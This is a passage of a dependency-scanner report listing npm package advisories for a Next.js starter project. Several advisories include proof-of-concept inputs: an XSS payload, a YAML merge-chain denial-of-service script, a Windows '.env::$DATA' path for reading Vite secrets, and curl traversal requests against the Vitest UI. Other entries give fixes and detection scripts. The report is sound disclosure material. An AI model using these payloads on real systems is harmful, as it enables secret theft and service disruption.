  <testsuite failures="0" errors="0" time="0" id="78" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/packages/i18n/package.json?i18n:0.1.0/i18next:25.6.0" package="i18next:25.6.0" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="i18next:25.6.0"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="79" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/packages/ui/package.json?ui:0.1.0/input-otp:1.4.2" package="input-otp:1.4.2" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="input-otp:1.4.2"/>
        
  </testsuite>
          
  <testsuite failures="1" errors="0" time="0" id="80" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/pnpm-lock.yaml?ip-address" package="ip-address" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="GHSA-v2v4-37r5-5v8g" name="pkg:npm/ip-address">
                      
      <failure message="unscored severity: moderate"/>
                  
      <system-out>### Summary

`Address6.group()` and `Address6.link()` do not HTML-escape attacker-controlled content before embedding it in the HTML strings they return, and `AddressError.parseMessage` (emitted by the `Address6` constructor for invalid input) can contain unescaped attacker-controlled content in one branch. An application that (1) passes untrusted input to `Address6` and (2) renders the output of these methods, or the thrown error's `parseMessage`, as HTML (e.g. via `innerHTML`) is vulnerable to cross-site scripting. A related issue in `v6.helpers.spanAll()` produced malformed markup but was not exploitable; it is hardened in the same release for consistency.

### Details

Four related issues were identified and fixed together:

1. **`Address6.group()`: zone ID injection.** The `Address6` constructor stores the raw input (including any IPv6 zone ID) in `this.address` before zone stripping. `group()` then passed `this.address` to `helpers.simpleGroup()`, which wrapped each `:`-separated segment in a `&lt;span&gt;` element without HTML-escaping the content. A zone ID containing HTML markup was embedded verbatim.
2. **`Address6.link({ prefix, className })`: attribute-value injection.** `link()` concatenated user-supplied `prefix` and `className` into the `href="…"` and `class="…"` attributes without escaping. A caller passing untrusted content through these options could inject event handlers (e.g. `onmouseover`) and achieve XSS.
3. **`Address6` constructor: leading-zero IPv4 error path.** The leading-zero branch in `parse4in6()` built `AddressError.parseMessage` by concatenating the raw address through `String.replace()`. Because `parse4in6()` runs before the bad-character check, any characters in the groups preceding the IPv4 suffix flowed into the error's HTML unescaped. Consumers who render `parseMessage` as HTML (its documented purpose — it already contains `&lt;span class="parse-error"&gt;` markup) could be XSS'd by a crafted input such as `&lt;img src=x onerror=alert(1)&gt;:10.0.01.1`.
4. **`v6.helpers.spanAll()`: attribute-value injection (defense in depth).** `spanAll()` embedded each character of its input into a `class="digit value-${n} …"` attribute without escaping. Because `split('')` limits `n` to a single character this was not exploitable in practice, but it produced malformed markup and is fixed for consistency.

### Affected Versions

All versions up to and including `10.1.0`.

### Patched Version

`10.1.1`.

### Impact

Real-world exposure is believed to be extremely limited. Analysis of all 425 dependent npm packages as well as GitHub code search found zero consumers of `group()`, `link()`, or `spanAll()`: these HTML-emitting surfaces appear to be unused across published npm packages and public repositories. Applications using only the address-parsing and comparison APIs (`isValid`, `correctForm`, `isInSubnet`, `bigInt`, etc.) are not affected.

Consumers who **do** render the output of `group()`, `link()`, `spanAll()`, or `AddressError.parseMessage` as HTML against untrusted input should upgrade.

### PoC

```javascript
const { Address6 } = require('ip-address');
const addr = new Address6('fe80::1%&lt;img src=x onerror=alert(1)&gt;');
document.body.innerHTML = addr.group();  // fires the onerror handler in 10.1.0
```

### Workarounds

If users cannot upgrade immediately:

- Do not pass untrusted input to the `Address6` constructor, or
- Never render the output of `group()`, `link()`, or `spanAll()`, nor the `parseMessage` field of any thrown `AddressError`, as HTML; treat these values as text only, or run them through [DOMPurify](https://github.com/cure53/DOMPurify) before inserting into the DOM (DOMPurify's default configuration preserves the library's intended `&lt;span&gt;` wrapping while stripping any injected event handlers), or
- Validate input with `Address6.isValid()` and reject anything that contains a zone identifier (a `%` character) or characters outside `[0-9a-fA-F:/]` before passing it to the constructor.

### Lack of separate CVEs

Given the evidence that these methods are not used, and given that they are all of the same construction, maintainers do not think it's relevant or useful to create a separate CVE for each library method.

### Credit

ip-address thanks @scovetta for reporting this issue.</system-out>
                  
      <system-err>location: /Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/pnpm-lock.yaml?ip-address, project-references: [ pnpm-lock.yaml: transitive ]</system-err>
              
    </testcase>
        
  </testsuite>
          
  <testsuite failures="1" errors="0" time="0" id="81" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/pnpm-lock.yaml?js-yaml" package="js-yaml" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="GHSA-52cp-r559-cp3m" name="pkg:npm/js-yaml">
                      
      <failure message="cvssV3: HIGH, score: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)"/>
                  
      <system-out>### Impact

js-yaml can spend quadratic CPU time parsing a document whose size grows only linearly. The issue is triggered by a chain of mappings where each mapping merges the previous one:

```yaml
a0: &amp;a0 { k0: 0 }
a1: &amp;a1 { &lt;&lt;: *a0, k1: 1 }
a2: &amp;a2 { &lt;&lt;: *a1, k2: 2 }
a3: &amp;a3 { &lt;&lt;: *a2, k3: 3 }
...
b: *aN
```

For each new mapping, the loader has to enumerate the keys inherited from the previous mapping. With N chained mappings, this results in roughly 1 + 2 + ... + N merged-key visits, i.e., O(N^2) work for O(N) input size.

### PoC

From N = 4000 delay become &gt; 1s (doc size &lt; 100K)

```js
import { performance } from 'node:perf_hooks'
import { Buffer } from 'node:buffer'
import { load, YAML11_SCHEMA } from 'js-yaml'

const n = Number(process.argv[2] || 4000)

function makeMergeChain (count) {
  const lines = ['a0: &amp;a0 { k0: 0 }']

  for (let i = 1; i &lt; count; i++) {
    lines.push(`a${i}: &amp;a${i} { &lt;&lt;: *a${i - 1}, k${i}: ${i} }`)
  }

  lines.push(`b: *a${count - 1}`)
  return `${lines.join('\n')}\n`
}

const source = makeMergeChain(n)

console.log(source.split('\n').slice(0, 8).join('\n'))
console.log('...')
console.log(source.split('\n').slice(-4).join('\n'))
console.log()
console.log(`N: ${n}`)
console.log(`YAML size: ${Buffer.byteLength(source)} bytes`)

const started = performance.now()
const result = load(source, { schema: YAML11_SCHEMA })
const elapsed = performance.now() - started

console.log(`parse time: ${elapsed.toFixed(1)} ms`)
console.log(`top-level keys: ${Object.keys(result).length}`)
console.log(`b keys: ${Object.keys(result.b).length}`)
```

### Patches

Fix released. The most robust protection is to limit the total number of merged keys per parse call. This should close all past and future edge cases with merge. The default 10K-key limit should be okay in most cases.</system-out>
                  
      <system-err>location: /Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/pnpm-lock.yaml?js-yaml, project-references: [ pnpm-lock.yaml: transitive ]</system-err>
              
    </testcase>
        
  </testsuite>
          
  <testsuite failures="1" errors="0" time="0" id="82" name="/Users/timothylefkowitz/projects/provenance/package.json?/leaflet:^1.9.4" package="leaflet:1.9.4" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="CVE-2025-69993" name="pkg:npm/leaflet@1.9.4">
                      
      <failure message="cvssV3: MEDIUM, score: 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N/E:P/RC:R/MAV:A)"/>
                  
[...]
- **Repository:** github.com/raszi/node-tmp
- **Affected versions:** All versions with vulnerable path construction logic
- **Patched versions:** None currently available

**Component Impact:**
- `tmp.file()` function - vulnerable to prefix/postfix/dir traversal
- `tmp.dir()` function - vulnerable to same parameter manipulation  
- `tmp.tmpName()` function - if using affected path construction

**Severity:** High  
**CVSS v3.1:** 8.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L)

**CWE Classification:**
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)

### Remediation

**Input Validation and Sanitization:**

1. **Sanitize prefix/postfix:**
```javascript
function sanitizePrefix(prefix) {
  if (!prefix) return '';
  // Remove path separators and traversal sequences
  return path.basename(String(prefix)).replace(/[\.\/\\]/g, '-');
}

function sanitizePostfix(postfix) {
  if (!postfix) return '';
  // Allow only safe characters
  return String(postfix).replace(/[^A-Za-z0-9._-]/g, '');
}
```

2. **Validate dir parameter:**
```javascript
function validateDir(dir, baseDir) {
  if (!dir) return '';
  
  // Reject absolute paths
  if (path.isAbsolute(dir)) {
    throw new Error('Absolute paths not allowed for dir option');
  }
  
  // Resolve and check containment
  const resolved = path.resolve(baseDir, dir);
  const relative = path.relative(baseDir, resolved);
  
  if (relative.startsWith('..') || path.isAbsolute(relative)) {
    throw new Error('Dir option escapes base directory');
  }
  
  return dir;
}
```

3. **Post-construction path validation:**
```javascript
function validateFinalPath(finalPath, baseDir) {
  const resolved = path.resolve(finalPath);
  const relative = path.relative(path.resolve(baseDir), resolved);
  
  if (relative.startsWith('..') || path.isAbsolute(relative)) {
    throw new Error('Generated path escapes temporary directory');
  }
  
  return resolved;
}
```

**Secure Implementation Pattern:**
```javascript
function createTempFile(options) {
  const opts = { ...options };
  
  // Sanitize inputs
  opts.prefix = sanitizePrefix(opts.prefix);
  opts.postfix = sanitizePostfix(opts.postfix);
  opts.dir = validateDir(opts.dir, opts.tmpdir);
  
  // Create with sanitized options
  return tmp.file(opts, (err, path, fd, cleanup) =&gt; {
    if (err) return callback(err);
    
    // Validate final path
    try {
      validateFinalPath(path, opts.tmpdir);
    } catch (validationErr) {
      cleanup();
      return callback(validationErr);
    }
    
    callback(null, path, fd, cleanup);
  });
}
```

### Workarounds

**For Application Developers:**

1. **Input Sanitization:**
```javascript
// Sanitize before passing to tmp
function safeTmpFile(userOptions) {
  const safeOpts = {
    ...userOptions,
    prefix: userOptions.prefix ? path.basename(userOptions.prefix) : undefined,
    postfix: userOptions.postfix ? userOptions.postfix.replace(/[^A-Za-z0-9._-]/g, '') : undefined,
    dir: undefined // Don't allow user-controlled dir
  };
  
  return tmp.file(safeOpts);
}
```

2. **Path Validation:**
```javascript
function validateTmpPath(tmpPath, expectedBase) {
  const relativePath = path.relative(expectedBase, tmpPath);
  if (relativePath.startsWith('..') || path.isAbsolute(relativePath)) {
    throw new Error('Temporary file path escaped base directory');
  }
  return tmpPath;
}
```

3. **Restricted Usage:**
```javascript
// Only use tmp with known-safe, literal values
tmp.file({ prefix: 'app-temp-', postfix: '.tmp' }, callback);
// Never: tmp.file({ prefix: userInput }, callback);
```

**For Security Teams:**

1. **Code Review Patterns:**
```bash
# Search for dangerous tmp usage
grep -r "tmp\.file.*prefix.*req\|tmp\.file.*postfix.*req" .
grep -r "tmp\.dir.*opts\|tmp\.file.*opts" .
```

2. **Runtime Monitoring:**
```javascript
// Monitor for files created outside expected temp areas
const originalFile = tmp.file;
tmp.file = function(options, callback) {
  return originalFile(options, (err, path, fd, cleanup) =&gt; {
    if (!err &amp;&amp; options.tmpdir) {
      const relative = require('path').relative(options.tmpdir, path);
      if (relative.startsWith('..')) {
        console.warn('Path traversal detected:', path);
      }
    }
    return callback(err, path, fd, cleanup);
  });
};
```

### Detection and Monitoring

**Static Analysis:**
- Scan for tmp usage with user-controlled input
- Identify unsanitized parameter passing to tmp functions
- Review file creation patterns in temporary directories

**Runtime Detection:**
```javascript
// Log suspicious tmp operations
function monitorTmpUsage() {
  const originalTmpFile = require('tmp').file;
  
  require('tmp').file = function(options = {}, callback) {
    // Check for suspicious patterns
    const suspicious = [
      options.prefix &amp;&amp; options.prefix.includes('..'),
      options.postfix &amp;&amp; options.postfix.includes('..'),  
      options.dir &amp;&amp; path.isAbsolute(options.dir)
    ].some(Boolean);
    
    if (suspicious) {
      console.warn('Suspicious tmp usage detected:', options);
    }
    
    return originalTmpFile.call(this, options, callback);
  };
}
```

**File System Monitoring:**
```bash
# Monitor file creation outside expected temp directories
inotifywait -m -r --format '%w%f %e' /tmp /var/tmp | while read file event; do
  if [[ "$event" == *"CREATE"* &amp;&amp; "$file" != /tmp/tmp-* ]]; then
    echo "Unexpected file creation: $file"
  fi
done
```
### Acknowledgements

**Reported by**: Mapta / BugBunny_ai</system-out>
                  
      <system-err>location: /Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/pnpm-lock.yaml?tmp, project-references: [ pnpm-lock.yaml: transitive ]</system-err>
              
    </testcase>
        
  </testsuite>
          
  <testsuite failures="1" errors="0" time="0" id="150" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/pnpm-lock.yaml?turbo" package="turbo" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="GHSA-hcf7-66rw-9f5r" name="pkg:npm/turbo">
                      
      <failure message="unscored severity: moderate"/>
                  
      <system-out>### Impact

Turborepo's self-hosted login and SSO browser flows did not validate a CSRF state value on the localhost callback. While the CLI was waiting for authentication, a malicious web page could send a request to the local callback server with an attacker-controlled token. If accepted before the legitimate callback, the CLI could complete login with the wrong credentials.

This affects users authenticating the `turbo` CLI against self-hosted remote cache/auth endpoints. Vercel-hosted login flows using device authorization are not affected.

### Fix

The login and SSO redirect flows now generate a random state value, include it in the browser authentication URL, and require the same value on the localhost callback before accepting a token. Callbacks with a missing or mismatched state are rejected.

### Workarounds

If you cannot upgrade immediately, avoid browser-based self-hosted `turbo login` or SSO flows on machines that may load untrusted web content during authentication. Use a pre-provisioned token or environment-based authentication instead.</system-out>
                  
      <system-err>location: /Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/pnpm-lock.yaml?turbo, project-references: [ pnpm-lock.yaml: transitive ]</system-err>
              
    </testcase>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="151" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/tooling/eslint/package.json?eslint-config:0.2.0/typescript-eslint:8.46.0" package="typescript-eslint:8.46.0" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="typescript-eslint:8.46.0"/>
        
  </testsuite>
          
  <testsuite failures="1" errors="0" time="0" id="152" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/pnpm-lock.yaml?uuid" package="uuid" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="GHSA-w5hq-g745-h8pq" name="pkg:npm/uuid">
                      
      <failure message="cvssV3: HIGH, score: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N)"/>
                  
      <system-out>### Summary

The `v3()`, `v5()`, and `v6()` [API methods](https://github.com/uuidjs/uuid#api-summary) (not `uuid` release versions) accept external output buffers but do not reject out-of-range writes (small `buf` or large `offset`).  
By contrast, `v4()`, `v1()`, and `v7()` API methods explicitly throw `RangeError` on invalid bounds.

This inconsistency allows **silent partial writes** into caller-provided buffers.


### Affected code

- `src/v35.ts` (`v3()`/`v5()` path) writes `buf[offset + i]` without bounds validation.
- `src/v6.ts` writes `buf[offset + i]` without bounds validation.

### Reproducible PoC

```bash
cd /home/StrawHat/uuid
npm ci
npm run build

node --input-type=module -e "
import {v4,v5,v6} from './dist-node/index.js';
const ns='6ba7b810-9dad-11d1-80b4-00c04fd430c8';
for (const [name,fn] of [
  ['v4()',()=&gt;v4({},new Uint8Array(8),4)],
  ['v5()',()=&gt;v5('x',ns,new Uint8Array(8),4)],
  ['v6()',()=&gt;v6({},new Uint8Array(8),4)],
]) {
  try { fn(); console.log(name,'NO_THROW'); }
  catch(e){ console.log(name,'THREW',e.name); }
}"
```

Observed:

- `v4() THREW RangeError`
- `v5() NO_THROW`
- `v6() NO_THROW`

Example partial overwrite evidence captured during audit:

```text
same true buf [
  170, 170, 170, 170,
   75, 224, 100,  63
]
v6 [
  187, 187, 187, 187,
   31,  19, 185,  64
]
```

### Security impact

- **Primary**: integrity/robustness issue (silent partial output).
- If an application assumes full UUID writes into preallocated buffers, this can produce malformed/truncated/partially stale identifiers without error.
- In systems where caller-controlled offsets/buffer sizes are exposed indirectly, this may become a security-relevant logic flaw.

### Suggested fix

Add the same guard used by `v4()`/`v1()`/`v7()`:

```ts
if (offset &lt; 0 || offset + 16 &gt; buf.length) {
  throw new RangeError(`UUID byte range ${offset}:${offset + 15} is out of buffer bounds`);
}
```

Apply to:

- `src/v35.ts` (covers `v3()` and `v5()`)
- `src/v6.ts`</system-out>
                  
      <system-err>location: /Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/pnpm-lock.yaml?uuid, project-references: [ pnpm-lock.yaml: transitive ]</system-err>
              
    </testcase>
        
  </testsuite>
          
  <testsuite failures="1" errors="0" time="0" id="153" name="/Users/timothylefkowitz/projects/provenance/pnpm-lock.yaml?vite" package="vite" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="GHSA-fx2h-pf6j-xcff" name="pkg:npm/vite">
                      
      <failure message="cvssV3: HIGH, score: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)"/>
                  
      <system-out>### Summary

The contents of files that are specified by [`server.fs.deny`](https://vite.dev/config/server-options#server-fs-deny) can be returned to the browser on Windows.

### Impact

Only apps that match the following conditions are affected:

- explicitly exposes the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))
- the sensitive file exists in the allowed directories specified by [`server.fs.allow`](https://vite.dev/config/server-options#server-fs-allow)
- either of:
  - the sensitive file exists in an NTFS volume
  - the dev server is running on Windows and the sensitive file exists in a volume that 8.3 short name generation is enabled (it is enabled by default on system volumes)

### Details

Vite’s dev server denies direct access to sensitive files through `server.fs.deny`, including entries such as `.env`, `.env.*`, and `*.{crt,pem}`. However, on Windows, the deny logic does not correctly normalize NTFS ADS path forms before access checks are applied.
Because of this, requests such as `/.env::$DATA?raw` are treated as allowed paths, while Windows resolves them to the original file's default data stream.

Similar to that, Windows allows accessing a file using a different name with the 8.3 short name compatibility feature. Vite did not reject accessing files via them.

### PoC
```bash
$ npm create vite@latest
$ cd vite-project/
$ npm install
$ npm run dev
```
Access via browser at `http://localhost:5173/.env::$DATA?raw`
&lt;img width="388" height="129" alt="deecc1315123883cfd0f9c26a002845a" src="https://github.com/user-attachments/assets/895c6012-4e2e-4a35-babb-69bbf3ee7170" /&gt;

Example expected result:
- `/.env::$DATA?raw` returns the contents of `.env`
- `/tls.pem::$DATA?raw` returns the contents of `tls.pem`</system-out>
                  
      <system-err>location: /Users/timothylefkowitz/projects/provenance/pnpm-lock.yaml?vite, project-references: [ pnpm-lock.yaml: transitive ]</system-err>
              
    </testcase>
        
  </testsuite>
          
  <testsuite failures="1" errors="0" time="0" id="154" name="/Users/timothylefkowitz/projects/provenance/pnpm-lock.yaml?vitest" package="vitest" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="GHSA-5xrq-8626-4rwp" name="pkg:npm/vitest">
                      
      <failure message="cvssV3: CRITICAL, score: 9.800000190734863 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)"/>
                  
      <system-out>### Summary
Arbitrary file can be read on Windows when Vitest UI server is listening, especially when exposed to the network.

### Impact
Only users that match either of the following conditions are affected:

- explicitly exposes the Vitest UI server to the network (using `--api.host` or [`api.host` config option](https://vitest.dev/config/api.html))
- running the Vitest UI or Browser Mode on Windows

### Details
The API handler for `/__vitest_attachment__` uses the deprecated `isFileServingAllowed` incorrectly.
https://github.com/vitest-dev/vitest/blob/eb1abf08573032a532015b999ad3501c5e89e3bb/packages/ui/node/index.ts#L77
The function expects the passed value to use `cleanUrl` after the check before file system related operation.
Because of this, it is possible to bypass the check by `\\?\\..\\`. This is not possible on Linux as Linux errors if a directory named `?` does not exist.

A similar problem exists in other places as well.
- https://github.com/vitest-dev/vitest/blob/eb1abf08573032a532015b999ad3501c5e89e3bb/packages/vitest/src/api/setup.ts#L103-L105
- https://github.com/vitest-dev/vitest/blob/eb1abf08573032a532015b999ad3501c5e89e3bb/packages/vitest/src/api/setup.ts#L119-L121
- https://github.com/vitest-dev/vitest/blob/eb1abf08573032a532015b999ad3501c5e89e3bb/packages/browser/src/node/commands/fs.ts#L10-L11
- https://github.com/vitest-dev/vitest/blob/eb1abf08573032a532015b999ad3501c5e89e3bb/packages/browser/src/node/plugin.ts#L194-L196
- https://github.com/vitest-dev/vitest/blob/eb1abf08573032a532015b999ad3501c5e89e3bb/packages/browser/src/node/rpc.ts#L115-L121

**That said**, this `isFileServingAllowed` check does not actually prevent the API to be abused. Since the API has rerun feature and file write feature, it's possible to run arbitrary script by writing a script as a test file using `saveTestFile` and running it using `rerun`. This means exposing the API / Vitest UI is equivalent to giving script execution access.
On the browser mode side, there're `readFile` / `writeFile` / `saveSnapshotFile`. So exposing the browser mode is equivalent to giving file read / write access.

### PoC
1. Run Vitest UI
2. Get the API token by `curl http://localhost:51204/__vitest__/`
3. Run `curl "http://localhost:51204/__vitest_attachment__?path=C:\\path\\to\\project\\?\\..\\..\\secret.txt&amp;amp;contentType=text/plain&amp;amp;token=$TOKEN"` (TOKEN is the API token)
4. curl shows the content of `secret.txt` that is outside the project directory

### Mitigations

Vitest now ships two configuration flags, [`allowWrite`](https://vitest.dev/config/api.html#api-allowwrite) and [`allowExec`](https://vitest.dev/config/api.html#api-allowexec), that gate the privileged operations exploited by this vulnerability. Both are disabled by default whenever the API server is bound to a non-`localhost` host, ensuring that exposing the server to the network no longer implicitly grants write or execute capabilities to remote clients.

When these flags are disabled, the UI also enters a read-only mode: in-browser code editing and test file execution are turned off, removing the attack surface that allowed remote code execution. Many Browser Mode features are also disabled, like attachments, artifacts or snapshots. See [`browser.api`](https://vitest.dev/config/browser/api.html#api-allowwrite).

Users who require the full interactive UI on a networked host must explicitly opt in by setting `allowWrite` and/or `allowExec` to `true`.</system-out>
                  
      <system-err>location: /Users/timothylefkowitz/projects/provenance/pnpm-lock.yaml?vitest, project-references: [ pnpm-lock.yaml: transitive ]</system-err>
              
    </testcase>
        
  </testsuite>
          
  <testsuite failures="1" errors="0" time="0" id="155" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/pnpm-lock.yaml?ws" package="ws" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="GHSA-58qx-3vcg-4xpx" name="pkg:npm/ws">
                      
      <failure message="cvssV3: MEDIUM, score: 4.400000095367432 (CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:N/A:N)"/>
                  
      <system-out>### Impact

The `websocket.close()` implementation is vulnerable to uninitialized memory disclosure when a `TypedArray` is passed as the reason argument.

### Proof of concept

```js
import { deepStrictEqual } from 'node:assert';
import { WebSocket, WebSocketServer } from 'ws';

const wss = new WebSocketServer(
  { port: 0, skipUTF8Validation: true },
  function () {
    const { port } = wss.address();
    const ws = new WebSocket(`ws://localhost:${port}`, {
      skipUTF8Validation: true
    });

    ws.on('close', function (code, reason) {
      deepStrictEqual(reason, Buffer.alloc(80));
    });
  }
);

wss.on('connection', function (ws) {
  ws.close(1000, new Float32Array(20));
});
```

### Patches

The vulnerability was fixed in ws@8.20.1 (https://github.com/websockets/ws/commit/c0327ec15a54d701eb6ccefaa8bef328cfc03086).

### Credits

Credit for the private and responsible disclosure of this issue goes to [Nikita Skovoroda](https://github.com/ChALkeR).

### Remarks

Although the calculated CVSS severity is medium, the actual severity is believed to be low, as the flaw is only exploitable through misuse that is unlikely in practice.

### Resources

- https://github.com/advisories/GHSA-58qx-3vcg-4xpx
- https://www.cve.org/CVERecord?id=CVE-2026-45736</system-out>
                  
      <system-err>location: /Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/pnpm-lock.yaml?ws, project-references: [ pnpm-lock.yaml: transitive ]</system-err>
              
    </testcase>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="156" name="/Users/timothylefkowitz/projects/provenance/package.json?/zod:^3.25.32" package="zod:3.25.76" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="zod:3.25.76"/>
        
  </testsuite>
  
</testsuites>
